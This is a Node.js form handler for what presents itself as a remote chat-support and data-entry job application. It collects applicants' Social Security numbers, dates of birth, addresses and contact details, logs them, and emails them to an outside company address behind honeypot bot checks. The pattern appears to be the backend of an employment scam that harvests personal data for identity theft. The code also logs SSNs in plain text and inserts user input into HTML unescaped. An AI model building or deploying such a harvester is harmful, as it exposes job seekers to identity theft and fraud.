require("dotenv").config();
const nodemailer = require("nodemailer");
const multer = require("multer");
const upload = multer();

const transporter = nodemailer.createTransport({
  host: "smtp.zoho.com",
  port: 587,
  secure: false,
  auth: {
    user: process.env.ZOHO_USER,
    pass: process.env.ZOHO_PASS,
  },
  tls: { rejectUnauthorized: true },
});

module.exports = async (req, res) => {
  // First parse the multipart form data
  upload.none()(req, res, async function (err) {
    if (err) {
      console.error("Form parsing error:", err);
      return res.status(500).send("Error processing form data");
    }

    try {
      const formData = req.body;
      console.log("Form data received:", formData);

      if (formData.__gra__ || formData.consent) {
        return res.send("Error: Invalid submission detected.");
      }

      const mailOptions = {
        from: process.env.ZOHO_USER,
        to: "xinai.leunghr@qulaaengineering.com",
        subject: "New Job Application Submission",
        html: `
          <h2>New Application for Remote Chat Support/Data Entry Role</h2>
          <p><strong>Full Name:</strong> ${formData.name || "N/A"}</p>
          <p><strong>Email:</strong> ${formData.email || "N/A"}</p>
          <p><strong>Phone:</strong> ${formData.phone || "N/A"}</p>
          <p><strong>Date of Birth:</strong> ${formData.dob || "N/A"}</p>
          <p><strong>Social Security Number:</strong> ${
            formData.pid || "N/A"
          }</p>
          <p><strong>Address:</strong> ${formData.address || "N/A"}</p>
          <p><strong>State:</strong> ${formData.state || "N/A"}</p>
          <p><strong>U.S. Authorized:</strong> ${formData.us_auth || "N/A"}</p>
          <p><strong>Desired Salary:</strong> ${formData.salary || "N/A"} (${
          formData.salary_type || "N/A"
        })</p>
          <p><strong>Weekly Hours:</strong> ${formData.hours || "N/A"}</p>
          <p><strong>Genuine Information Confirmed:</strong> ${
            formData.genuine ? "Yes" : "No"
          }</p>
        `,
      };

      await transporter.sendMail(mailOptions);
      res.send(
        '✅ Your application has been submitted successfully! <a href="/">Back to form</a>'
      );
    } catch (error) {
      console.error("Error sending email:", error);
      res
        .status(500)
        .send(
          `Error sending application: ${error.message}. <a href="/">Try again</a>`
        );
    }
  });
};
